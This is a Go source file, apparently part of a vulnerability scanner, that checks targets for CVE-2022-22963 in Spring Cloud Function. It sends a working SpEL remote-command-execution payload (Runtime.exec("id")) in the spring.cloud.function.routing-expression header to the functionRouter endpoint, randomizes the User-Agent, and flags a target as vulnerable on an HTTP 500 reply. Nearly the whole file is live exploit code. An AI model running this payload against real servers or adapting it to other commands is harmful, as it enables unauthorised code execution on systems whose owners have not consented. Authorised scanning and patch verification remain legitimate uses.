package exppackage

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
	"time"
)

func CVE_2022_22963(url string) {
	payload := `T(java.lang.Runtime).getRuntime().exec("id")`
	data := "test"
	header := map[string]string{
		"spring.cloud.function.routing-expression": payload,
		"Accept-Encoding":                          "gzip, deflate",
		"Accept":                                   "*/*",
		"Accept-Language":                          "en",
		"User-Agent":                               common.GetRandomUserAgent(),
		"Content-Type":                             "application/x-www-form-urlencoded",
	}
	path := "functionRouter"

	client := &http.Client{
		Timeout: 6 * time.Second,
	}

	urltest := url + path
	req, err := http.NewRequest("POST", urltest, strings.NewReader(data))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range header {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if resp.StatusCode == 500 && strings.Contains(string(body), `"error":"Internal Server Error"`) {
		common.PrintVulnerabilityConfirmation("CVE-2022-22963", url, "存在漏洞，由于该漏洞无回显，请用Dnslog进行测试", "4")
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22963远程命令执行漏洞\n", url)
	}
}
